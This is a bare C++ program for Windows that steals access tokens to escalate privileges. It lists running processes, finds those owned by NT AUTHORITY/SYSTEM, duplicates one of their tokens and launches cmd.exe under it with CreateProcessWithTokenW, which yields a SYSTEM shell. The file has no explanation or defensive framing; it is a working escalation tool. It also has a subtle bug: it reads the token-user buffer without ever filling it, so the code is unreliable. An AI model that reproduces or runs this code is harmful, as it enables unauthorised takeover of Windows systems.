#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>

using namespace std;

HANDLE getToken(DWORD pid) {
    HANDLE cToken = NULL;
    HANDLE ph = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (ph != NULL) {
        if (OpenProcessToken(ph, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &cToken)) {
            CloseHandle(ph);
            return cToken;
        }
        CloseHandle(ph);
    }
    return NULL;
}

string GetProcessUserName(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess)
        return "";

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        CloseHandle(hProcess);
        return "";
    }

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(dwSize);
    SID_NAME_USE SidType;
    char lpName[MAX_PATH];
    DWORD dwNameSize = MAX_PATH;
    char lpDomain[MAX_PATH];
    DWORD dwDomainSize = MAX_PATH;

    if (!LookupAccountSid(NULL, pTokenUser->User.Sid, lpName, &dwNameSize, lpDomain, &dwDomainSize, &SidType)) {
        free(pTokenUser);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return "";
    }

    string username(lpDomain);
    username += "/";
    username += lpName;
    free(pTokenUser);
    CloseHandle(hToken);
    CloseHandle(hProcess);

    return username;
}
BOOL createProcess(HANDLE token, LPCWSTR app) {
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(STARTUPINFOW));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFOW);

    BOOL res = CreateProcessWithTokenW(token, LOGON_WITH_PROFILE, app, NULL, 0, NULL, NULL, &si, &pi);
    if (res) {
        // Wait for the process to exit
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return res;
}

int main() {
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        pid = pe32.th32ProcessID;
        string username = GetProcessUserName(pid);
        if (username == "" || username == "NT AUTHORITY/SYSTEM") {
            bool success = false;
            HANDLE cToken = getToken(pid);
            if (cToken != NULL) {
                LPCWSTR LPCapp = L"C:\\Windows\\System32\\cmd.exe";
                success = createProcess(cToken, LPCapp);
                if (success) {
                    break;
                }
            }
        }
    }

    CloseHandle(hProcSnap);

    return 0;
}

